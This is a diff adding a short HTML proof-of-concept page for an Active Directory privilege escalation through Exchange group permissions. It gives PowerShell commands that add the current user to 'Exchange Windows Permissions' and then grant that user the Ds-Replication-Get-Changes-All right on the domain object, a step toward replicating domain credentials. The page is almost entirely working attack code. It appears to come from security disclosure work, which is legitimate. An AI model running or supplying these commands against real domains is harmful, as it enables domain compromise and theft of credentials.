@@ -1,0 +1,26 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PoC 1</title>
+</head><body>From an <b>Organization Management member account</b>, add yourself to <b>Exchange Windows Permissions</b>. This is possible by default (see the above technet page).<br/>
+<br/>
+$id = [Security.Principal.WindowsIdentity]::GetCurrent()<br/>
+$user = Get-ADUser -Identity $id.User<br/>
+Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user<br/>
+<br/>
+RELOG to update groups in your token then give yourself Ds-Replication-Get-Changes-All extended right on the domain object.<br/>
+<br/>
+$acl = get-acl "ad:DC=test,DC=local"<br/>
+$id = [Security.Principal.WindowsIdentity]::GetCurrent()<br/>
+$user = Get-ADUser -Identity $id.User<br/>
+$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID<br/>
+# rightsGuid for the extended right Ds-Replication-Get-Changes-All<br/>
+$objectguid = new-object Guid &nbsp;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2<br/>
+$identity = [System.Security.Principal.IdentityReference] $sid<br/>
+$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"<br/>
+$type = [System.Security.AccessControl.AccessControlType] "Allow"<br/>
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"<br/>
+$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType<br/>
+$acl.AddAccessRule($ace)<br/>
+Set-acl -aclobject $acl "ad:DC=test,DC=com"</body></html>
